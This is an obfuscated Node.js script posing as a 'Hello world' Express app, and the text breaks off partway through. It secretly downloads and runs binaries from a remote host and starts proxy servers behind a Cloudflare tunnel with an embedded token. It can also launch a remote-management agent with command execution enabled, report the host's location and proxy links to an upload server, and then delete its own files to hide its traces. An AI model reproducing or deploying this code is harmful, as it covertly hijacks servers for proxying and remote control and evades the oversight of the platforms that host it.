function _0x2beb(_0x2933c5,_0x1acceb){_0x2933c5=_0x2933c5-0x116;const _0x285760=_0x2857();let _0x2beb0e=_0x285760[_0x2933c5];return _0x2beb0e;}const _0x1b6d0a=_0x2beb;(function(_0x30d0ee,_0x4eee9e){const _0x491805=_0x2beb,_0x528c76=_0x30d0ee();while(!![]){try{const _0x58fb95=parseInt(_0x491805(0x149))/0x1+-parseInt(_0x491805(0x196))/0x2*(-parseInt(_0x491805(0x1d2))/0x3)+-parseInt(_0x491805(0x188))/0x4+parseInt(_0x491805(0x148))/0x5+-parseInt(_0x491805(0x127))/0x6*(-parseInt(_0x491805(0x163))/0x7)+-parseInt(_0x491805(0x1c4))/0x8*(parseInt(_0x491805(0x137))/0x9)+-parseInt(_0x491805(0x1d4))/0xa;if(_0x58fb95===_0x4eee9e)break;else _0x528c76['push'](_0x528c76['shift']());}catch(_0x8fa264){_0x528c76['push'](_0x528c76['shift']());}}}(_0x2857,0x9f6c2));const express=require(_0x1b6d0a(0x11d)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1b6d0a(0x140)),{promisify}=require(_0x1b6d0a(0x16b)),exec=promisify(require(_0x1b6d0a(0x135))[_0x1b6d0a(0x12e)]),{execSync}=require(_0x1b6d0a(0x135)),UPLOAD_URL=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x124)]||'',PROJECT_URL=process['env'][_0x1b6d0a(0x1ad)]||'',AUTO_ACCESS=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x1b4)]||![],FILE_PATH=process[_0x1b6d0a(0x183)]['FILE_PATH']||_0x1b6d0a(0x1c9),SUB_PATH=process['env'][_0x1b6d0a(0x122)]||_0x1b6d0a(0x133),PORT=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x1be)]||process[_0x1b6d0a(0x183)]['PORT']||0xbb8,UUID=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x1d9)]||'5459bfcf-9416-46e6-86a8-024fdfc69dc6',NEZHA_SERVER=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x165)]||'',NEZHA_PORT=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x13b)]||'',NEZHA_KEY=process['env'][_0x1b6d0a(0x14a)]||'',ARGO_DOMAIN=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x1ca)]||_0x1b6d0a(0x154),ARGO_AUTH=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x14e)]||'eyJhIjoiZDA0M2ZlYzc0YjVhZWY3YjFjZmU1ZGJlMDFhY2ZkMzUiLCJ0IjoiOWNhZTcwYzctODkxOC00MTgwLTgxZTYtY2U1ODZhOWMwMTI3IiwicyI6IllUWm1PV0ZqTkdRdFpqRTJaQzAwTWpnM0xXRmxaak10TVRGa016VmxOVFkxTmpJMSJ9',ARGO_PORT=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x171)]||0x1f41,CFIP=process[_0x1b6d0a(0x183)]['CFIP']||_0x1b6d0a(0x197),CFPORT=process[_0x1b6d0a(0x183)]['CFPORT']||0x1bb,NAME=process[_0x1b6d0a(0x183)][_0x1b6d0a(0x161)]||_0x1b6d0a(0x14c);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1b6d0a(0x178)](FILE_PATH+_0x1b6d0a(0x1a4))):console[_0x1b6d0a(0x178)](FILE_PATH+_0x1b6d0a(0x1b8));function generateRandomName(){const _0x3338ca=_0x1b6d0a,_0x3319ee='abcdefghijklmnopqrstuvwxyz';let _0x209e81='';for(let _0x12ea57=0x0;_0x12ea57<0x6;_0x12ea57++){_0x209e81+=_0x3319ee['charAt'](Math[_0x3338ca(0x18e)](Math[_0x3338ca(0x166)]()*_0x3319ee['length']));}return _0x209e81;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1b6d0a(0x14b)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1b6d0a(0x14b)](FILE_PATH,webName),botPath=path[_0x1b6d0a(0x14b)](FILE_PATH,botName),subPath=path[_0x1b6d0a(0x14b)](FILE_PATH,_0x1b6d0a(0x1a9)),listPath=path[_0x1b6d0a(0x14b)](FILE_PATH,_0x1b6d0a(0x1cc)),bootLogPath=path[_0x1b6d0a(0x14b)](FILE_PATH,_0x1b6d0a(0x13e)),configPath=path[_0x1b6d0a(0x14b)](FILE_PATH,_0x1b6d0a(0x1d8));function deleteNodes(){const _0x2f3e6f=_0x1b6d0a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2d1215;try{_0x2d1215=fs['readFileSync'](subPath,_0x2f3e6f(0x1bb));}catch{return null;}const _0x12c6fe=Buffer[_0x2f3e6f(0x18f)](_0x2d1215,_0x2f3e6f(0x1a3))[_0x2f3e6f(0x18c)](_0x2f3e6f(0x1bb)),_0x3b8647=_0x12c6fe[_0x2f3e6f(0x1c2)]('\x0a')['filter'](_0x21d3b4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x21d3b4));if(_0x3b8647['length']===0x0)return;return axios[_0x2f3e6f(0x15f)](UPLOAD_URL+_0x2f3e6f(0x141),JSON['stringify']({'nodes':_0x3b8647}),{'headers':{'Content-Type':'application/json'}})[_0x2f3e6f(0x15e)](_0x1a2261=>{return null;}),null;}catch(_0x1223e9){return null;}}function cleanupOldFiles(){try{const _0x1943b4=fs['readdirSync'](FILE_PATH);_0x1943b4['forEach'](_0x3c15ba=>{const _0xaecd1f=_0x2beb,_0x2bd0e8=path['join'](FILE_PATH,_0x3c15ba);try{const _0x1147f8=fs[_0xaecd1f(0x12b)](_0x2bd0e8);_0x1147f8[_0xaecd1f(0x116)]()&&fs['unlinkSync'](_0x2bd0e8);}catch(_0x576122){}});}catch(_0x156bfc){}}function _0x2857(){const _0x494f54=['chmod','match','ARGO_PORT','pipe','ArgoDomain:','/vless-argo','http://ip-api.com/json/','filter','127.0.0.1','log','ARGO_DOMAIN:','\x20successfully','countryCode','npm\x20running\x20error:\x20','country_code','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','org','amd','status','https+local://8.8.8.8/dns-query','env','Nodes\x20uploaded\x20successfully','application/json','charAt','set','4429020ekUwaH','direct','https://amd64.ssss.nyc.mn/agent','\x20>\x20nul\x202>&1','toString','App\x20is\x20running','floor','from','includes','listen','get','quic','\x0avless://','taskkill\x20/f\x20/im\x20','1322taKkUU','cdns.doon.eu.org','\x20-c\x20','message','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20-p\x20','success','has','error','stream','Add\x20automatic\x20access\x20task\x20faild:\x20','vmess','?encryption=none&security=tls&sni=','base64','\x20is\x20created','&fp=firefox&type=ws&host=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','https://amd64.ssss.nyc.mn/web','sub.txt','https://arm64.ssss.nyc.mn/agent','none','unlinkSync','PROJECT_URL','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/v1','/vmess-argo','Skipping\x20adding\x20automatic\x20access\x20task','TunnelSecret','Download\x20','AUTO_ACCESS','\x20>/dev/null\x202>&1\x20&','close','http','\x20already\x20exists','Empowerment\x20success\x20for\x20','createWriteStream','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','fileUrl','SERVER_PORT','freedom','Subscription\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','split','2083','264ycVbUb','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2087','/tunnel.yml\x20run','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','./tmp','ARGO_DOMAIN','Empowerment\x20failed\x20for\x20','list.txt','2053','push','arm64','del\x20/f\x20/q\x20','forEach','1623BqzakM','unshift','6256970VAurGA','tunnel.json','8443','\x20-c\x20\x22','config.json','UUID','isFile','config.yaml','arch','unlink','mkdirSync','/dev/null','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','express','&path=%2Ftrojan-argo%3Fed%3D2560#','block','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','SUB_PATH','stringify','UPLOAD_URL','aarch64','length','42hkonfu','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','statSync','\x0a\x0atrojan://','443','exec','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','test','\x0a\x20\x20credentials-file:\x20','/trojan-argo','5459bfcf-9416-46e6-86a8-024fdfc69dc6','&path=%2Fvless-argo%3Fed%3D2560#','child_process','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','22014NFmgxn','\x20is\x20running','firefox','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_PORT','false','/api/add-subscriptions','boot.log','arm','path','/api/delete-nodes','clear','Error\x20executing\x20command:\x20','fileName','\x20>/dev/null\x202>&1','vless','\x20failed:\x20','2572730YqQrpz','560617UQpCTO','NEZHA_KEY','join','render','readFileSync','ARGO_AUTH','https://amd64.ssss.nyc.mn/v1','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','nohup\x20','existsSync','render.shuang.de5.net','https://arm64.ssss.nyc.mn/web','\x0aclient_secret:\x20','all','Content-Type','win32','basename','trojan','blackhole','tcp','catch','post','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NAME','tls','1033900dLBtPY','writeFileSync','NEZHA_SERVER','random','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','data','pkill\x20-f\x20\x22[','util','text/plain;\x20charset=utf-8','send','response'];_0x2857=function(){return _0x494f54;};return _0x2857();}app[_0x1b6d0a(0x192)]('/',function(_0x2ef1b7,_0x183ea8){const _0x5e4ab7=_0x1b6d0a;_0x183ea8[_0x5e4ab7(0x16d)]('Hello\x20world!');});async function generateConfig(){const _0x59e519=_0x1b6d0a,_0xa1b54={'log':{'access':_0x59e519(0x11b),'error':'/dev/null','loglevel':_0x59e519(0x1ab)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x59e519(0x146),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x59e519(0x1ab),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x59e519(0x132),'dest':0xbbc}]},'streamSettings':{'network':_0x59e519(0x15d)}},{'port':0xbb9,'listen':_0x59e519(0x177),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x59e519(0x15d),'security':_0x59e519(0x1ab)}},{'port':0xbba,'listen':_0x59e519(0x177),'protocol':_0x59e519(0x146),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x59e519(0x1ab)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x59e519(0x174)}},'sniffing':{'enabled':!![],'destOverride':[_0x59e519(0x1b7),_0x59e519(0x162),_0x59e519(0x193)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x59e519(0x1a1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x59e519(0x1b0)}},'sniffing':{'enabled':!![],'destOverride':[_0x59e519(0x1b7),_0x59e519(0x162),_0x59e519(0x193)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x59e519(0x177),'protocol':_0x59e519(0x15b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x59e519(0x1b7),'tls',_0x59e519(0x193)],'metadataOnly':![]}}],'dns':{'servers':[_0x59e519(0x182)]},'outbounds':[{'protocol':_0x59e519(0x1bf),'tag':_0x59e519(0x189)},{'protocol':_0x59e519(0x15c),'tag':_0x59e519(0x11f)}]};fs[_0x59e519(0x164)](path[_0x59e519(0x14b)](FILE_PATH,_0x59e519(0x1d8)),JSON[_0x59e519(0x123)](_0xa1b54,null,0x2));}function getSystemArchitecture(){const _0xc695a6=_0x1b6d0a,_0x3c1aea=os[_0xc695a6(0x118)]();return _0x3c1aea==='arm'||_0x3c1aea===_0xc695a6(0x1cf)||_0x3c1aea===_0xc695a6(0x125)?_0xc695a6(0x13f):_0xc695a6(0x180);}function downloadFile(_0x11ebf0,_0xd80355,_0x2a7394){const _0x1ce41e=_0x1b6d0a,_0x3f2d6c=_0x11ebf0;!fs[_0x1ce41e(0x153)](FILE_PATH)&&fs[_0x1ce41e(0x11a)](FILE_PATH,{'recursive':!![]});const _0x13276d=fs[_0x1ce41e(0x1ba)](_0x3f2d6c);axios({'method':_0x1ce41e(0x192),'url':_0xd80355,'responseType':_0x1ce41e(0x19f)})['then'](_0x2288cb=>{const _0x153e9b=_0x1ce41e;_0x2288cb[_0x153e9b(0x169)][_0x153e9b(0x172)](_0x13276d),_0x13276d['on']('finish',()=>{const _0x27a6be=_0x153e9b;_0x13276d[_0x27a6be(0x1b6)](),console[_0x27a6be(0x178)](_0x27a6be(0x1b3)+path[_0x27a6be(0x15a)](_0x3f2d6c)+_0x27a6be(0x17a)),_0x2a7394(null,_0x3f2d6c);}),_0x13276d['on'](_0x153e9b(0x19e),_0x57a102=>{const _0x326dbe=_0x153e9b;fs[_0x326dbe(0x119)](_0x3f2d6c,()=>{});const _0x37ab0f=_0x326dbe(0x1b3)+path['basename'](_0x3f2d6c)+_0x326dbe(0x147)+_0x57a102[_0x326dbe(0x199)];console[_0x326dbe(0x19e)](_0x37ab0f),_0x2a7394(_0x37ab0f);});})[_0x1ce41e(0x15e)](_0x36b365=>{const _0x23d472=_0x1ce41e,_0x23e415='Download\x20'+path[_0x23d472(0x15a)](_0x3f2d6c)+_0x23d472(0x147)+_0x36b365[_0x23d472(0x199)];console['error'](_0x23e415),_0x2a7394(_0x23e415);});}async function downloadFilesAndRun(){const _0x4dadbb=_0x1b6d0a,_0x5b6787=getSystemArchitecture(),_0x58768a=getFilesForArchitecture(_0x5b6787);if(_0x58768a['length']===0x0){console[_0x4dadbb(0x178)](_0x4dadbb(0x1c5));return;}const _0x4d34fa=_0x58768a['map'](_0x1a33ed=>{return new Promise((_0x4fc6b0,_0x5e519e)=>{const _0x386e12=_0x2beb;downloadFile(_0x1a33ed[_0x386e12(0x144)],_0x1a33ed[_0x386e12(0x1bd)],(_0x545ae7,_0x36be73)=>{_0x545ae7?_0x5e519e(_0x545ae7):_0x4fc6b0(_0x36be73);});});});try{await Promise[_0x4dadbb(0x157)](_0x4d34fa);}catch(_0x3fb39e){console[_0x4dadbb(0x19e)]('Error\x20downloading\x20files:',_0x3fb39e);return;}function _0x1311a6(_0x412a64){const _0x5c26b8=_0x4dadbb,_0x431992=0x1fd;_0x412a64[_0x5c26b8(0x1d1)](_0x2f37c2=>{const _0x2ba7cd=_0x5c26b8;fs[_0x2ba7cd(0x153)](_0x2f37c2)&&fs[_0x2ba7cd(0x16f)](_0x2f37c2,_0x431992,_0x235301=>{const _0x143a16=_0x2ba7cd;_0x235301?console[_0x143a16(0x19e)](_0x143a16(0x1cb)+_0x2f37c2+':\x20'+_0x235301):console[_0x143a16(0x178)](_0x143a16(0x1b9)+_0x2f37c2+':\x20'+_0x431992[_0x143a16(0x18c)](0x8));});});}const _0x52ffbe=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1311a6(_0x52ffbe);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1402d4=NEZHA_SERVER[_0x4dadbb(0x190)](':')?NEZHA_SERVER[_0x4dadbb(0x1c2)](':')['pop']():'',_0x2ef6c1=new Set([_0x4dadbb(0x12d),'8443',_0x4dadbb(0x1a7),_0x4dadbb(0x1c6),_0x4dadbb(0x1c3),_0x4dadbb(0x1cd)]),_0x4221f4=_0x2ef6c1[_0x4dadbb(0x19d)](_0x1402d4)?'true':_0x4dadbb(0x13c),_0x10deda=_0x4dadbb(0x156)+NEZHA_KEY+_0x4dadbb(0x1a6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4221f4+_0x4dadbb(0x17e)+UUID;fs['writeFileSync'](path[_0x4dadbb(0x14b)](FILE_PATH,_0x4dadbb(0x117)),_0x10deda);const _0x3fa0db=_0x4dadbb(0x152)+phpPath+_0x4dadbb(0x1d7)+FILE_PATH+_0x4dadbb(0x136);try{await exec(_0x3fa0db),console[_0x4dadbb(0x178)](phpName+_0x4dadbb(0x138)),await new Promise(_0x5a20fe=>setTimeout(_0x5a20fe,0x3e8));}catch(_0x4bbf16){console['error']('php\x20running\x20error:\x20'+_0x4bbf16);}}else{let _0x5f304a='';const _0x560fa4=[_0x4dadbb(0x12d),_0x4dadbb(0x1d6),_0x4dadbb(0x1a7),_0x4dadbb(0x1c6),_0x4dadbb(0x1c3),_0x4dadbb(0x1cd)];_0x560fa4[_0x4dadbb(0x190)](NEZHA_PORT)&&(_0x5f304a='--tls');const _0xbb481d='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4dadbb(0x19b)+NEZHA_KEY+'\x20'+_0x5f304a+_0x4dadbb(0x11c);try{await exec(_0xbb481d),console[_0x4dadbb(0x178)](npmName+'\x20is\x20running'),await new Promise(_0x4e104d=>setTimeout(_0x4e104d,0x3e8));}catch(_0x5cd335){console[_0x4dadbb(0x19e)](_0x4dadbb(0x17c)+_0x5cd335);}}}else console[_0x4dadbb(0x178)](_0x4dadbb(0x19a));const _0x419d68=_0x4dadbb(0x152)+webPath+_0x4dadbb(0x198)+FILE_PATH+_0x4dadbb(0x150);try{await exec(_0x419d68),console['log'](webName+'\x20is\x20running'),await new Promise(_0x3c6cbe=>setTimeout(_0x3c6cbe,0x3e8));}catch(_0x59c0c2){console[_0x4dadbb(0x19e)]('web\x20running\x20error:\x20'+_0x59c0c2);}if(fs[_0x4dadbb(0x153)](botPath)){let _0x2dd014;if(ARGO_AUTH[_0x4dadbb(0x170)](/^[A-Z0-9a-z=]{120,250}$/))_0x2dd014=_0x4dadbb(0x1bc)+ARGO_AUTH;else ARGO_AUTH[_0x4dadbb(0x170)](/TunnelSecret/)?_0x2dd014=_0x4dadbb(0x121)+FILE_PATH+_0x4dadbb(0x1c7):_0x2dd014=_0x4dadbb(0x129)+FILE_PATH+_0x4dadbb(0x167)+ARGO_PORT;try{await exec(_0x4dadbb(0x152)+botPath+'\x20'+_0x2dd014+_0x4dadbb(0x1b5)),console['log'](botName+_0x4dadbb(0x138)),await new Promise(_0x115a5e=>setTimeout(_0x115a5e,0x7d0));}catch(_0x12f1c0){console['error'](_0x4dadbb(0x143)+_0x12f1c0);}}await new Promise(_0x24f72c=>setTimeout(_0x24f72c,0x1388));}function getFilesForArchitecture(_0x5744b2){const _0x29af9a=_0x1b6d0a;let _0x5b3585;_0x5744b2==='arm'?_0x5b3585=[{'fileName':webPath,'fileUrl':_0x29af9a(0x155)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5b3585=[{'fileName':webPath,'fileUrl':_0x29af9a(0x1a8)},{'fileName':botPath,'fileUrl':_0x29af9a(0x151)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5aba4e=_0x5744b2===_0x29af9a(0x13f)?_0x29af9a(0x1aa):_0x29af9a(0x18a);_0x5b3585[_0x29af9a(0x1d3)]({'fileName':npmPath,'fileUrl':_0x5aba4e});}else{const _0x2a19ec=_0x5744b2===_0x29af9a(0x13f)?_0x29af9a(0x1af):_0x29af9a(0x14f);_0x5b3585['unshift']({'fileName':phpPath,'fileUrl':_0x2a19ec});}}return _0x5b3585;}function argoType(){const _0x1ce81b=_0x1b6d0a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ce81b(0x178)](_0x1ce81b(0x168));return;}if(ARGO_AUTH['includes'](_0x1ce81b(0x1b2))){fs[_0x1ce81b(0x164)](path['join'](FILE_PATH,_0x1ce81b(0x1d5)),ARGO_AUTH);const _0x5efbdd='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x1ce81b(0x1c2)]('\x22')[0xb]+_0x1ce81b(0x131)+path['join'](FILE_PATH,'tunnel.json')+_0x1ce81b(0x1c8)+ARGO_DOMAIN+_0x1ce81b(0x13a)+ARGO_PORT+_0x1ce81b(0x12f);fs[_0x1ce81b(0x164)](path[_0x1ce81b(0x14b)](FILE_PATH,'tunnel.yml'),_0x5efbdd);}else console[_0x1ce81b(0x178)](_0x1ce81b(0x160));}async function extractDomains(){const _0x11fb80=_0x1b6d0a;let _0x120d35;if(ARGO_AUTH&&ARGO_DOMAIN)_0x120d35=ARGO_DOMAIN,console[_0x11fb80(0x178)](_0x11fb80(0x179),_0x120d35),await _0x25341f(_0x120d35);else try{const _0x18f7e7=fs['readFileSync'](path[_0x11fb80(0x14b)](FILE_PATH,'boot.log'),'utf-8'),_0x2feffa=_0x18f7e7[_0x11fb80(0x1c2)]('\x0a'),_0xf77d3e=[];_0x2feffa[_0x11fb80(0x1d1)](_0x1f8f8e=>{const _0x12bb40=_0x11fb80,_0x5e9541=_0x1f8f8e[_0x12bb40(0x170)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5e9541){const _0x5886d7=_0x5e9541[0x1];_0xf77d3e[_0x12bb40(0x1ce)](_0x5886d7);}});if(_0xf77d3e[_0x11fb80(0x126)]>0x0)_0x120d35=_0xf77d3e[0x0],console[_0x11fb80(0x178)](_0x11fb80(0x173),_0x120d35),await _0x25341f(_0x120d35);else{console[_0x11fb80(0x178)](_0x11fb80(0x12a)),fs[_0x11fb80(0x1ac)](path[_0x11fb80(0x14b)](FILE_PATH,_0x11fb80(0x13e)));async function _0x5d942d(){const _0x2c80d9=_0x11fb80;try{process['platform']===_0x2c80d9(0x159)?await exec(_0x2c80d9(0x195)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2c80d9(0x16a)+botName[_0x2c80d9(0x186)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x36beab){}}_0x5d942d(),await new Promise(_0x50aafc=>setTimeout(_0x50aafc,0xbb8));const _0x1eee94=_0x11fb80(0x129)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x11fb80(0x152)+botPath+'\x20'+_0x1eee94+'\x20>/dev/null\x202>&1\x20&'),console[_0x11fb80(0x178)](botName+_0x11fb80(0x138)),await new Promise(_0x2f8d27=>setTimeout(_0x2f8d27,0xbb8)),await extractDomains();}catch(_0x3ec6d9){console[_0x11fb80(0x19e)]('Error\x20executing\x20command:\x20'+_0x3ec6d9);}}}catch(_0x39a7b3){console['error']('Error\x20reading\x20boot.log:',_0x39a7b3);}async function _0x222b23(){const _0x5a475f=_0x11fb80;try{const _0x3e672a=await axios[_0x5a475f(0x192)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3e672a['data']&&_0x3e672a[_0x5a475f(0x169)][_0x5a475f(0x17d)]&&_0x3e672a[_0x5a475f(0x169)][_0x5a475f(0x17f)])return _0x3e672a['data']['country_code']+'_'+_0x3e672a['data'][_0x5a475f(0x17f)];}catch(_0x5ad226){try{const _0x15b9b4=await axios[_0x5a475f(0x192)](_0x5a475f(0x175),{'timeout':0xbb8});if(_0x15b9b4['data']&&_0x15b9b4[_0x5a475f(0x169)][_0x5a475f(0x181)]===_0x5a475f(0x19c)&&_0x15b9b4[_0x5a475f(0x169)]['countryCode']&&_0x15b9b4[_0x5a475f(0x169)]['org'])return _0x15b9b4[_0x5a475f(0x169)][_0x5a475f(0x17b)]+'_'+_0x15b9b4[_0x5a475f(0x169)][_0x5a475f(0x17f)];}catch(_0x128601){}}return'Unknown';}async function _0x25341f(_0x1b4807){const _0x3e2fe4=await _0x222b23(),_0x3f60f7=NAME?NAME+'-'+_0x3e2fe4:_0x3e2fe4;return new Promise(_0x43a2e1=>{setTimeout(()=>{const _0x1e30d4=_0x2beb,_0x537c13={'v':'2','ps':''+_0x3f60f7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1e30d4(0x1ab),'host':_0x1b4807,'path':'/vmess-argo?ed=2560','tls':_0x1e30d4(0x162),'sni':_0x1b4807,'alpn':'','fp':_0x1e30d4(0x139)},_0x1fada0=_0x1e30d4(0x194)+UUID+'@'+CFIP+':'+CFPORT+_0x1e30d4(0x1a2)+_0x1b4807+_0x1e30d4(0x1a5)+_0x1b4807+_0x1e30d4(0x134)+_0x3f60f7+_0x1e30d4(0x120)+Buffer[_0x1e30d4(0x18f)](JSON[_0x1e30d4(0x123)](_0x537c13))[_0x1e30d4(0x18c)](_0x1e30d4(0x1a3))+_0x1e30d4(0x12c)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1b4807+_0x1e30d4(0x1a5)+_0x1b4807+_0x1e30d4(0x11e)+_0x3f60f7+_0x1e30d4(0x128);console[_0x1e30d4(0x178)](Buffer[_0x1e30d4(0x18f)](_0x1fada0)[_0x1e30d4(0x18c)](_0x1e30d4(0x1a3))),fs[_0x1e30d4(0x164)](subPath,Buffer[_0x1e30d4(0x18f)](_0x1fada0)[_0x1e30d4(0x18c)](_0x1e30d4(0x1a3))),console[_0x1e30d4(0x178)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1e30d4(0x192)]('/'+SUB_PATH,(_0xda8af2,_0x7da69f)=>{const _0x3484f3=_0x1e30d4,_0x14b584=Buffer[_0x3484f3(0x18f)](_0x1fada0)[_0x3484f3(0x18c)](_0x3484f3(0x1a3));_0x7da69f[_0x3484f3(0x187)](_0x3484f3(0x158),_0x3484f3(0x16c)),_0x7da69f[_0x3484f3(0x16d)](_0x14b584);}),_0x43a2e1(_0x1fada0);},0x7d0);});}}async function uploadNodes(){const _0x475dd4=_0x1b6d0a;if(UPLOAD_URL&&PROJECT_URL){const _0x2f61e8=PROJECT_URL+'/'+SUB_PATH,_0xcf6ee7={'subscription':[_0x2f61e8]};try{const _0x41e33d=await axios[_0x475dd4(0x15f)](UPLOAD_URL+_0x475dd4(0x13d),_0xcf6ee7,{'headers':{'Content-Type':_0x475dd4(0x185)}});return _0x41e33d&&_0x41e33d[_0x475dd4(0x181)]===0xc8?(console['log'](_0x475dd4(0x1c0)),_0x41e33d):null;}catch(_0x1051fb){if(_0x1051fb[_0x475dd4(0x16e)]){if(_0x1051fb[_0x475dd4(0x16e)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x475dd4(0x153)](listPath))return;const _0x1bd46e=fs[_0x475dd4(0x14d)](listPath,_0x475dd4(0x1bb)),_0x5d1163=_0x1bd46e['split']('\x0a')[_0x475dd4(0x176)](_0x511266=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x475dd4(0x130)](_0x511266));if(_0x5d1163[_0x475dd4(0x126)]===0x0)return;const _0x515822=JSON['stringify']({'nodes':_0x5d1163});try{const _0x185ef6=await axios[_0x475dd4(0x15f)](UPLOAD_URL+'/api/add-nodes',_0x515822,{'headers':{'Content-Type':_0x475dd4(0x185)}});return _0x185ef6&&_0x185ef6[_0x475dd4(0x181)]===0xc8?(console[_0x475dd4(0x178)](_0x475dd4(0x184)),_0x185ef6):null;}catch(_0x38298e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x82fcbb=_0x2beb,_0x2a7810=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2a7810[_0x82fcbb(0x1ce)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2a7810[_0x82fcbb(0x1ce)](phpPath);process['platform']===_0x82fcbb(0x159)?exec(_0x82fcbb(0x1d0)+_0x2a7810['join']('\x20')+_0x82fcbb(0x18b),_0x365f69=>{const _0x50c792=_0x82fcbb;console[_0x50c792(0x142)](),console[_0x50c792(0x178)](_0x50c792(0x18d)),console[_0x50c792(0x178)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x2a7810[_0x82fcbb(0x14b)]('\x20')+_0x82fcbb(0x145),_0x5b5a16=>{const _0x1559dd=_0x82fcbb;console[_0x1559dd(0x142)](),console[_0x1559dd(0x178)]('App\x20is\x20running'),console[_0x1559dd(0x178)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1d1763=_0x1b6d0a;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x1d1763(0x1b1));return;}try{const _0x3e0d5d=await 